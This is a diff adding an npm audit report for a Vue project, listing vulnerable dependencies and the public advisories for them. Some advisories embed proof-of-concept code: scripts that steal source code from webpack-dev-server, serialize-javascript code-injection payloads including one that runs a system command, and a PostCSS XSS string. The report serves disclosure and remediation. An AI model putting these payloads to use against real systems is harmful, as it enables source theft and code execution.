@@ -1,0 +1,1102 @@
+{
+  "actions": [
+    {
+      "action": "review",
+      "module": "wangeditor",
+      "resolves": [
+        {
+          "id": 1086982,
+          "path": ".>@form-create/designer>@form-create/component-wangeditor>wangeditor",
+          "dev": false,
+          "bundled": false,
+          "optional": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "cross-spawn",
+      "resolves": [
+        {
+          "id": 1104663,
+          "path": ".>@vue/cli-plugin-eslint>yorkie>execa>cross-spawn",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "webpack-dev-server",
+      "resolves": [
+        {
+          "id": 1108429,
+          "path": ".>@vue/cli-service>webpack-dev-server",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1108430,
+          "path": ".>@vue/cli-service>webpack-dev-server",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1119074,
+          "path": ".>@vue/cli-service>webpack-dev-server",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1121087,
+          "path": ".>@vue/cli-service>webpack-dev-server",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1123965,
+          "path": ".>@vue/cli-service>webpack-dev-server",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1123966,
+          "path": ".>@vue/cli-service>webpack-dev-server",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "postcss",
+      "resolves": [
+        {
+          "id": 1109574,
+          "path": ".>@vue/cli-service>@vue/component-compiler-utils>postcss",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1117015,
+          "path": ".>@vue/cli-service>@vue/component-compiler-utils>postcss",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1124252,
+          "path": ".>@vue/cli-service>@vue/component-compiler-utils>postcss",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1130709,
+          "path": ".>@vue/cli-service>@vue/component-compiler-utils>postcss",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1139510,
+          "path": ".>@vue/cli-service>@vue/component-compiler-utils>postcss",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "vue-template-compiler",
+      "resolves": [
+        {
+          "id": 1111772,
+          "path": ".>@vue/cli-service>vue-template-compiler",
+          "dev": false,
+          "bundled": false,
+          "optional": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "serialize-javascript",
+      "resolves": [
+        {
+          "id": 1113686,
+          "path": ".>@vue/cli-service>copy-webpack-plugin>serialize-javascript",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1119440,
+          "path": ".>@vue/cli-service>copy-webpack-plugin>serialize-javascript",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1243082,
+          "path": ".>@vue/cli-service>copy-webpack-plugin>serialize-javascript",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "uuid",
+      "resolves": [
+        {
+          "id": 1119441,
+          "path": ".>@vue/cli-service>webpack-dev-server>sockjs>uuid",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "echarts",
+      "resolves": [
+        {
+          "id": 1122144,
+          "path": ".>echarts",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "webpack-dev-middleware",
+      "resolves": [
+        {
+          "id": 1240027,
+          "path": ".>@vue/cli-service>webpack-dev-server>webpack-dev-middleware",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "glob",
+      "resolves": [
+        {
+          "id": 1244013,
+          "path": ".>@form-create/designer>js-beautify>glob",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "minimatch",
+      "resolves": [
+        {
+          "id": 1244623,
+          "path": ".>@form-create/designer>js-beautify>editorconfig>minimatch",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    }
+  ],
+  "advisories": {
+    "1086982": {
+      "findings": [
+        {
+          "version": "4.7.15",
+          "paths": [
+            ".>@form-create/designer>@form-create/component-wangeditor>wangeditor"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/wangfupeng1988/wangEditor/issues/1945\n- https://snyk.io/vuln/SNYK-JS-WANGEDITOR-174536\n- https://www.npmjs.com/advisories/876\n- https://github.com/advisories/GHSA-g7mw-5cq6-fv82",
+      "created": "2020-09-02T21:20:40.000Z",
+      "id": 1086982,
+      "npm_advisory_id": null,
+      "overview": "All versions of `wangeditor` are vulnerable to Cross-Site Scripting. The package fails to properly encode output, allowing arbitrary JavaScript to be inserted in links and executed by browsers.\n\n\n## Recommendation\n\nNo fix is currently available. Consider using an alternative module until a fix is made available.",
+      "reported_by": null,
+      "title": "Cross-Site Scripting in wangeditor",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "high",
+      "module_name": "wangeditor",
+      "vulnerable_versions": ">=0",
+      "github_advisory_id": "GHSA-g7mw-5cq6-fv82",
+      "recommendation": "None",
+      "patched_versions": "<0.0.0",
+      "updated": "2023-01-09T05:04:05.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-g7mw-5cq6-fv82"
+    },
+    "1104663": {
+      "findings": [
+        {
+          "version": "5.1.0",
+          "paths": [
+            ".>@vue/cli-plugin-eslint>yorkie>execa>cross-spawn"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2024-21538\n- https://github.com/moxystudio/node-cross-spawn/pull/160\n- https://github.com/moxystudio/node-cross-spawn/commit/5ff3a07d9add449021d806e45c4168203aa833ff\n- https://github.com/moxystudio/node-cross-spawn/commit/640d391fde65388548601d95abedccc12943374f\n- https://security.snyk.io/vuln/SNYK-JS-CROSSSPAWN-8303230\n- https://github.com/moxystudio/node-cross-spawn/issues/165\n- https://github.com/moxystudio/node-cross-spawn/commit/d35c865b877d2f9ded7c1ed87521c2fdb689c8dd\n- https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-8366349\n- https://github.com/advisories/GHSA-3xgq-45jj-v275",
+      "created": "2024-11-08T06:30:47.000Z",
+      "id": 1104663,
+      "npm_advisory_id": null,
+      "overview": "Versions of the package cross-spawn before 7.0.5 are vulnerable to Regular Expression Denial of Service (ReDoS) due to improper input sanitization. An attacker can increase the CPU usage and crash the program by crafting a very large and well crafted string.",
+      "reported_by": null,
+      "title": "Regular Expression Denial of Service (ReDoS) in cross-spawn",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-21538"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "cross-spawn",
+      "vulnerable_versions": "<6.0.6",
+      "github_advisory_id": "GHSA-3xgq-45jj-v275",
+      "recommendation": "Upgrade to version 6.0.6 or later",
+      "patched_versions": ">=6.0.6",
+      "updated": "2025-05-19T19:56:26.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-3xgq-45jj-v275"
+    },
+    "1108429": {
+      "findings": [
+        {
+          "version": "4.15.2",
+          "paths": [
+            ".>@vue/cli-service>webpack-dev-server"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-9jgg-88mc-972h\n- https://nvd.nist.gov/vuln/detail/CVE-2025-30360\n- https://github.com/webpack/webpack-dev-server/commit/72efaab83381a0e1c4914adf401cbd210b7de7eb\n- https://github.com/webpack/webpack-dev-server/commit/d2575ad8dfed9207ed810b5ea0ccf465115a2239\n- https://github.com/webpack/webpack-dev-server/blob/55220a800ba4e30dbde2d98785ecf4c80b32f711/lib/Server.js#L3113-L3127\n- https://github.com/webpack/webpack-dev-server/commit/5c9378bb01276357d7af208a0856ca2163db188e\n- https://github.com/advisories/GHSA-9jgg-88mc-972h",
+      "created": "2025-06-04T21:09:38.000Z",
+      "id": 1108429,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nSource code may be stolen when you access a malicious web site with non-Chromium based browser.\n\n### Details\nThe `Origin` header is checked to prevent Cross-site WebSocket hijacking from happening which was reported by CVE-2018-14732.\nBut webpack-dev-server always allows IP address `Origin` headers.\nhttps://github.com/webpack/webpack-dev-server/blob/55220a800ba4e30dbde2d98785ecf4c80b32f711/lib/Server.js#L3113-L3127\nThis allows websites that are served on IP addresses to connect WebSocket.\nBy using the same method described in [the article](https://blog.cal1.cn/post/Sniffing%20Codes%20in%20Hot%20Module%20Reloading%20Messages) linked from CVE-2018-14732, the attacker get the source code.\n\nrelated commit: https://github.com/webpack/webpack-dev-server/commit/72efaab83381a0e1c4914adf401cbd210b7de7eb (note that `checkHost` function was only used for Host header to prevent DNS rebinding attacks so this change itself is fine.\n\nThis vulnerability does not affect Chrome 94+ (and other Chromium based browsers) users due to [the non-HTTPS private access blocking feature](https://developer.chrome.com/blog/private-network-access-update#chrome_94).\n\n### PoC\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18418233/reproduction.zip) and extract it\n2. Run `npm i`\n3. Run `npx webpack-dev-server`\n4. Open `http://{ipaddress}/?target=http://localhost:8080&file=main` with a non-Chromium browser (I used Firefox 134.0.1)\n5. Edit `src/index.js` in the extracted directory\n6. You can see the content of `src/index.js`\n\n![image](https://github.com/user-attachments/assets/7ce3cad7-1a4d-4778-baae-1adae5e93ba4)\n\nThe script in the POC site is:\n```js\nwindow.webpackHotUpdate = (...args) => {\n    console.log(...args);\n    for (i in args[1]) {\n        document.body.innerText = args[1][i].toString() + document.body.innerText\n\t    console.log(args[1][i])\n    }\n}\n\nlet params = new URLSearchParams(window.location.search);\nlet target = new URL(params.get('target') || 'http://127.0.0.1:8080');\nlet file = params.get('file')\nlet wsProtocol = target.protocol === 'http:' ? 'ws' : 'wss';\nlet wsPort = target.port;\nvar currentHash = '';\nvar currentHash2 = '';\nlet wsTarget = `${wsProtocol}://${target.hostname}:${wsPort}/ws`;\nws = new WebSocket(wsTarget);\nws.onmessage = event => {\n    console.log(event.data);\n    if (event.data.match('\"type\":\"ok\"')) {\n        s = document.createElement('script');\n        s.src = `${target}${file}.${currentHash2}.hot-update.js`;\n        document.body.appendChild(s)\n    }\n    r = event.data.match(/\"([0-9a-f]{20})\"/);\n    if (r !== null) {\n        currentHash2 = currentHash;\n        currentHash = r[1];\n        console.log(currentHash, currentHash2);\n    }\n}\n```\n\n### Impact\nThis vulnerability can result in the source code to be stolen for users that uses a predictable port and uses a non-Chromium based browser.",
+      "reported_by": null,
+      "title": "webpack-dev-server users' source code may be stolen when they access a malicious web site with non-Chromium based browser",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-30360"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "webpack-dev-server",
+      "vulnerable_versions": "<=5.2.0",
+      "github_advisory_id": "GHSA-9jgg-88mc-972h",
+      "recommendation": "Upgrade to version 5.2.1 or later",
+      "patched_versions": ">=5.2.1",
+      "updated": "2025-10-03T13:25:56.000Z",
+      "cvss": {
+        "score": 6.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-346"
+      ],
+      "url": "https://github.com/advisories/GHSA-9jgg-88mc-972h"
+    },
+    "1108430": {
+      "findings": [
+        {
+          "version": "4.15.2",
+          "paths": [
+            ".>@vue/cli-service>webpack-dev-server"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-4v9v-hfq4-rm2v\n- https://nvd.nist.gov/vuln/detail/CVE-2025-30359\n- https://github.com/webpack/webpack-dev-server/commit/5c9378bb01276357d7af208a0856ca2163db188e\n- https://github.com/webpack/webpack-dev-server/commit/d2575ad8dfed9207ed810b5ea0ccf465115a2239\n- https://github.com/advisories/GHSA-4v9v-hfq4-rm2v",
+      "created": "2025-06-04T21:09:13.000Z",
+      "id": 1108430,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nSource code may be stolen when you access a malicious web site.\n\n### Details\nBecause the request for classic script by a script tag is not subject to same origin policy, an attacker can inject `<script src=\"http://localhost:8080/main.js\">` in their site and run the script. Note that the attacker has to know the port and the output entrypoint script path. Combined with prototype pollution, the attacker can get a reference to the webpack runtime variables.\nBy using `Function::toString` against the values in `__webpack_modules__`, the attacker can get the source code.\n\n### PoC\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18426585/reproduction.zip) and extract it\n2. Run `npm i`\n3. Run `npx webpack-dev-server`\n4. Open `https://e29c9a88-a242-4fb4-9e64-b24c9d29b35b.pages.dev/`\n5. You can see the source code output in the document and the devtools console.\n\n![image](https://github.com/user-attachments/assets/9d4dcdca-5d24-4c84-a7b4-feb1782bca09)\n\nThe script in the POC site is:\n```js\nlet moduleList\nconst onHandlerSet = (handler) => {\n  console.log('h', handler)\n  moduleList = handler.require.m\n}\n\nconst originalArrayForEach = Array.prototype.forEach\nArray.prototype.forEach = function forEach(callback, thisArg) {\n  callback((handler) => {\n    onHandlerSet(handler)\n  })\n  originalArrayForEach.call(this, callback, thisArg)\n  Array.prototype.forEach = originalArrayForEach\n}\n\nconst script = document.createElement('script')\nscript.src = 'http://localhost:8080/main.js'\nscript.addEventListener('load', () => {\n  console.log(moduleList)\n  for (const key in moduleList) {\n    const p = document.createElement('p')\n    const title = document.createElement('strong')\n    title.textContent = key\n    const code = document.createElement('code')\n    code.textContent = moduleList[key].toString()\n    p.append(title, ':', document.createElement('br'), code)\n    document.body.appendChild(p)\n  }\n})\ndocument.head.appendChild(script)\n```\n\nThis script uses the function generated by [`renderRequire`](https://github.com/webpack/webpack/blob/3919c844eca394d73ca930e4fc5506fb86e2b094/lib/javascript/JavascriptModulesPlugin.js#L1383).\n```js\n    // The require function\n    function __webpack_require__(moduleId) {\n        // Check if module is in cache\n        var cachedModule = __webpack_module_cache__[moduleId];\n        if (cachedModule !== undefined) {\n            return cachedModule.exports;\n        }\n        // Create a new module (and put it into the cache)\n        var module = __webpack_module_cache__[moduleId] = {\n            // no module.id needed\n            // no module.loaded needed\n            exports: {}\n        };\n        // Execute the module function\n        var execOptions = {\n            id: moduleId,\n            module: module,\n            factory: __webpack_modules__[moduleId],\n            require: __webpack_require__\n        };\n        __webpack_require__.i.forEach(function(handler) {\n            handler(execOptions);\n        });\n        module = execOptions.module;\n        execOptions.factory.call(module.exports, module, module.exports, execOptions.require);\n        // Return the exports of the module\n        return module.exports;\n    }\n```\nEspecially, it uses the fact that `Array::forEach` is called for `__webpack_require__.i` and `execOptions` contains `__webpack_require__`.\nIt uses prototype pollution against `Array::forEach` to extract `__webpack_require__` reference.\n\n### Impact\nThis vulnerability can result in the source code to be stolen for users that uses a predictable port and output path for the entrypoint script.\n\n<details>\n<summary>Old content</summary>\n\n### Summary\nSource code may be stolen when you use [`output.iife: false`](https://webpack.js.org/configuration/output/#outputiife) and access a malicious web site.\n\n### Details\nWhen `output.iife: false` is set, some global variables for the webpack runtime are declared on the `window` object (e.g. `__webpack_modules__`).\nBecause the request for classic script by a script tag is not subject to same origin policy, an attacker can inject `<script src=\"http://localhost:8080/main.js\">` in their site and run the script. Note that the attacker has to know the port and the output entrypoint script path. By running that, the webpack runtime variables will be declared on the `window` object.\nBy using `Function::toString` against the values in `__webpack_modules__`, the attacker can get the source code.\n\nI pointed out `output.iife: false`, but if there are other options that makes the webpack runtime variables to be declared on the `window` object, the same will apply for those cases.\n\n### PoC\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18409777/reproduction.zip) and extract it\n2. Run `npm i`\n3. Run `npx webpack-dev-server`\n4. Open `https://852aafa3-5f83-44da-9fc6-ea116d0e3035.pages.dev/`\n5. Open the devtools console.\n6. You can see the content of `src/index.js` and other scripts loaded.\n\n![image](https://github.com/user-attachments/assets/87801607-57bb-4656-bc0d-2bfbe207f436)\n\nThe script in the POC site is:\n```js\nconst script = document.createElement('script')\nscript.src = 'http://localhost:8080/main.js'\nscript.addEventListener('load', () => {\n    for (const module in window.__webpack_modules__) {\n        console.log(`${module}:`, window.__webpack_modules__[module].toString())\n    }\n})\ndocument.head.appendChild(script)\n```\n\n### Impact\nThis vulnerability can result in the source code to be stolen for users that has `output.iife: false` option set and uses a predictable port and output path for the entrypoint script.\n\n</details>",
+      "reported_by": null,
+      "title": "webpack-dev-server users' source code may be stolen when they access a malicious web site",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-30359"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "webpack-dev-server",
+      "vulnerable_versions": "<=5.2.0",
+      "github_advisory_id": "GHSA-4v9v-hfq4-rm2v",
+      "recommendation": "Upgrade to version 5.2.1 or later",
+      "patched_versions": ">=5.2.1",
+      "updated": "2025-10-03T13:25:41.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-749"
+      ],
+      "url": "https://github.com/advisories/GHSA-4v9v-hfq4-rm2v"
+    },
+    "1109574": {
+      "findings": [
+        {
+          "version": "7.0.39",
+          "paths": [
+            ".>@vue/cli-service>@vue/component-compiler-utils>postcss"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2023-44270\n- https://github.com/postcss/postcss/commit/58cc860b4c1707510c9cd1bc1fa30b423a9ad6c5\n- https://github.com/postcss/postcss/blob/main/lib/tokenize.js#L25\n- https://github.com/postcss/postcss/releases/tag/8.4.31\n- https://github.com/github/advisory-database/issues/2820\n- https://lists.debian.org/debian-lts-announce/2024/12/msg00025.html\n- https://github.com/advisories/GHSA-7fh5-64p2-3v2j",
+      "created": "2023-09-30T00:31:10.000Z",
+      "id": 1109574,
+      "npm_advisory_id": null,
+      "overview": "An issue was discovered in PostCSS before 8.4.31. It affects linters using PostCSS to parse external Cascading Style Sheets (CSS). There may be `\\r` discrepancies, as demonstrated by `@font-face{ font:(\\r/*);}` in a rule.\n\nThis vulnerability affects linters using PostCSS to parse external untrusted CSS. An attacker can prepare CSS in such a way that it will contains parts parsed by PostCSS as a CSS comment. After processing by PostCSS, it will be included in the PostCSS output in CSS nodes (rules, properties) despite being originally included in a comment.",
+      "reported_by": null,
+      "title": "PostCSS line return parsing error",
+      "metadata": null,
+      "cves": [
+        "CVE-2023-44270"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "postcss",
+      "vulnerable_versions": "<8.4.31",
+      "github_advisory_id": "GHSA-7fh5-64p2-3v2j",
+      "recommendation": "Upgrade to version 8.4.31 or later",
+      "patched_versions": ">=8.4.31",
+      "updated": "2025-11-04T16:45:03.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-74",
+        "CWE-144"
+      ],
+      "url": "https://github.com/advisories/GHSA-7fh5-64p2-3v2j"
+    },
+    "1111772": {
+      "findings": [
+        {
+          "version": "2.7.16",
+          "paths": [
+            ".>@vue/cli-service>vue-template-compiler"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2024-6783\n- https://www.herodevs.com/vulnerability-directory/cve-2024-6783\n- https://github.com/advisories/GHSA-g3ch-rx76-35fx",
+      "created": "2024-07-23T15:31:09.000Z",
+      "id": 1111772,
+      "npm_advisory_id": null,
+      "overview": "A vulnerability has been discovered in vue-template-compiler, that allows an attacker to perform XSS via prototype pollution. The attacker could change the prototype chain of some properties such as `Object.prototype.staticClass` or `Object.prototype.staticStyle` to execute arbitrary JavaScript code. Vue 2 has reached End-of-Life. This vulnerability has been patched in Vue 3.",
+      "reported_by": null,
+      "title": "vue-template-compiler vulnerable to client-side Cross-Site Scripting (XSS)",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-6783"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "vue-template-compiler",
+      "vulnerable_versions": ">=2.0.0 <3.0.0",
+      "github_advisory_id": "GHSA-g3ch-rx76-35fx",
+      "recommendation": "None",
+      "patched_versions": "<0.0.0",
+      "updated": "2025-12-31T22:04:14.000Z",
+      "cvss": {
+        "score": 4.2,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-g3ch-rx76-35fx"
+    },
+    "1113686": {
+      "findings": [
+        {
+          "version": "6.0.2",
+          "paths": [
+            ".>@vue/cli-service>copy-webpack-plugin>serialize-javascript"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/yahoo/serialize-javascript/security/advisories/GHSA-5c6j-r48x-rmvq\n- https://nvd.nist.gov/vuln/detail/CVE-2020-7660\n- https://github.com/yahoo/serialize-javascript/commit/2e609d0a9f4f5b097f0945af88bd45b9c7fb48d9\n- https://github.com/advisories/GHSA-hxcc-f52p-wc94\n- https://github.com/yahoo/serialize-javascript/releases/tag/v7.0.3\n- https://github.com/advisories/GHSA-5c6j-r48x-rmvq",
+      "created": "2026-02-28T02:50:45.000Z",
+      "id": 1113686,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nThe serialize-javascript npm package (versions <= 7.0.2) contains a code injection vulnerability. It is an incomplete fix for CVE-2020-7660.\n\nWhile `RegExp.source` is sanitized, `RegExp.flags` is interpolated directly into the generated output without escaping. A similar issue exists in `Date.prototype.toISOString()`.\n\nIf an attacker can control the input object passed to `serialize()`, they can inject malicious JavaScript via the flags property of a RegExp object. When the serialized string is later evaluated (via `eval`, `new Function`, or `<script>` tags), the injected code executes.\n\n```javascript\nconst serialize = require('serialize-javascript');\n// Create an object that passes instanceof RegExp with a spoofed .flags\nconst fakeRegex = Object.create(RegExp.prototype);\nObject.defineProperty(fakeRegex, 'source', { get: () => 'x' });\nObject.defineProperty(fakeRegex, 'flags', {\n  get: () => '\"+(global.PWNED=\"CODE_INJECTION_VIA_FLAGS\")+\"'\n});\nfakeRegex.toJSON = function() { return '@placeholder'; };\nconst output = serialize({ re: fakeRegex });\n// Output: {\"re\":new RegExp(\"x\", \"\"+(global.PWNED=\"CODE_INJECTION_VIA_FLAGS\")+\"\")}\nlet obj;\neval('obj = ' + output);\nconsole.log(global.PWNED); // \"CODE_INJECTION_VIA_FLAGS\" — injected code executed!\n#h2. PoC 2: Code Injection via Date.toISOString()\n```\n\n```javascript\nconst serialize = require('serialize-javascript');\nconst fakeDate = Object.create(Date.prototype);\nfakeDate.toISOString = function() { return '\"+(global.DATE_PWNED=\"DATE_INJECTION\")+\"'; };\nfakeDate.toJSON = function() { return '2024-01-01'; };\nconst output = serialize({ d: fakeDate });\n// Output: {\"d\":new Date(\"\"+(global.DATE_PWNED=\"DATE_INJECTION\")+\"\")}\neval('obj = ' + output);\nconsole.log(global.DATE_PWNED); // \"DATE_INJECTION\" — injected code executed!\n#h2. PoC 3: Remote Code Execution\n```\n\n```javascript\nconst serialize = require('serialize-javascript');\nconst rceRegex = Object.create(RegExp.prototype);\nObject.defineProperty(rceRegex, 'source', { get: () => 'x' });\nObject.defineProperty(rceRegex, 'flags', {\n  get: () => '\"+require(\"child_process\").execSync(\"id\").toString()+\"'\n});\nrceRegex.toJSON = function() { return '@rce'; };\nconst output = serialize({ re: rceRegex });\n// Output: {\"re\":new RegExp(\"x\", \"\"+require(\"child_process\").execSync(\"id\").toString()+\"\")}\n// When eval'd on a Node.js server, executes the \"id\" system command\n```\n\n### Patches\n\nThe fix has been published in version 7.0.3. https://github.com/yahoo/serialize-javascript/releases/tag/v7.0.3",
+      "reported_by": null,
+      "title": "Serialize JavaScript is Vulnerable to RCE via RegExp.flags and Date.prototype.toISOString()",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "high",
+      "module_name": "serialize-javascript",
+      "vulnerable_versions": "<=7.0.2",
+      "github_advisory_id": "GHSA-5c6j-r48x-rmvq",
+      "recommendation": "Upgrade to version 7.0.3 or later",
+      "patched_versions": ">=7.0.3",
+      "updated": "2026-03-02T16:17:37.000Z",
+      "cvss": {
+        "score": 8.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-96"
+      ],
+      "url": "https://github.com/advisories/GHSA-5c6j-r48x-rmvq"
+    },
+    "1117015": {
+      "findings": [
+        {
+          "version": "7.0.39",
+          "paths": [
+            ".>@vue/cli-service>@vue/component-compiler-utils>postcss"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/postcss/postcss/security/advisories/GHSA-qx2v-qp2m-jg93\n- https://nvd.nist.gov/vuln/detail/CVE-2026-41305\n- https://github.com/postcss/postcss/releases/tag/8.5.10\n- https://github.com/advisories/GHSA-qx2v-qp2m-jg93",
+      "created": "2026-04-24T15:31:42.000Z",
+      "id": 1117015,
+      "npm_advisory_id": null,
+      "overview": "# PostCSS: XSS via Unescaped `</style>` in CSS Stringify Output\n\n## Summary\n\nPostCSS v8.5.5 (latest) does not escape `</style>` sequences when stringifying CSS ASTs. When user-submitted CSS is parsed and re-stringified for embedding in HTML `<style>` tags, `</style>` in CSS values breaks out of the style context, enabling XSS.\n\n## Proof of Concept\n\n```javascript\nconst postcss = require('postcss');\n\n// Parse user CSS and re-stringify for page embedding\nconst userCSS = 'body { content: \"</style><script>alert(1)</script><style>\"; }';\nconst ast = postcss.parse(userCSS);\nconst output = ast.toResult().css;\nconst html = `<style>${output}</style>`;\n\nconsole.log(html);\n// <style>body { content: \"</style><script>alert(1)</script><style>\"; }</style>\n//\n// Browser: </style> closes the style tag, <script> executes\n```\n\n**Tested output** (Node.js v22, postcss v8.5.5):\n```\nInput: body { content: \"</style><script>alert(1)</script><style>\"; }\nOutput: body { content: \"</style><script>alert(1)</script><style>\"; }\nContains </style>: true\n```\n\n## Impact\n\nImpact non-bundler use cases since bundlers for XSS on their own. Requires some PostCSS plugin to have malware code, which can inject XSS to website.\n\n## Suggested Fix\n\nEscape `</style` in all stringified output values:\n```javascript\noutput = output.replace(/<\\/(style)/gi, '<\\\\/$1');\n```\n\n## Credits\nDiscovered and reported by [Sunil Kumar](https://tharvid.in) ([@TharVid](https://github.com/TharVid))",
+      "reported_by": null,
+      "title": "PostCSS has XSS via Unescaped </style> in its CSS Stringify Output",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-41305"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "postcss",
+      "vulnerable_versions": "<8.5.10",
+      "github_advisory_id": "GHSA-qx2v-qp2m-jg93",
+      "recommendation": "Upgrade to version 8.5.10 or later",
+      "patched_versions": ">=8.5.10",
+      "updated": "2026-04-24T15:31:44.000Z",
+      "cvss": {
+        "score": 6.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-qx2v-qp2m-jg93"
+    },
+    "1119074": {
+      "findings": [
+        {
+          "version": "4.15.2",
+          "paths": [
+            ".>@vue/cli-service>webpack-dev-server"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-4v9v-hfq4-rm2v\n- https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-79cf-xcqc-c78w\n- https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-9jgg-88mc-972h\n- https://nvd.nist.gov/vuln/detail/CVE-2026-6402\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/advisories/GHSA-79cf-xcqc-c78w",
+      "created": "2026-05-18T13:31:42.000Z",
+      "id": 1119074,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nWhen webpack-dev-server is running on a non-HTTPS origin (the default), cross-origin requests from malicious websites can load the dev server's JavaScript bundles via `<script>` tags. The fix introduced in v5.2.1 (CVE-2025-30359) relied on `Sec-Fetch-Mode` and `Sec-Fetch-Site` request headers to block these requests, but browsers only send these headers for [potentially trustworthy origins](https://w3c.github.io/webappsec-secure-contexts/#is-origin-trustworthy). Over plain HTTP, the headers are absent and the check is bypassed.\n\nAn attacker who knows the dev server's host, port, and output path can exfiltrate all module source code by intercepting the webpack runtime's module registration.\n\nThis does not affect Chrome 142+ (and other Chromium-based browsers) due to [local network access restrictions](https://developer.chrome.com/release-notes/142#local_network_access_restrictions).\n\n### Patches\n\nPatched in webpack-dev-server >= 5.2.4 by setting `Cross-Origin-Resource-Policy: same-origin` on responses.\n\n### Workarounds\n\nRun the dev server with HTTPS enabled (`--https` or `server.type: 'https'` in config).\n\n### Resources\n\n- 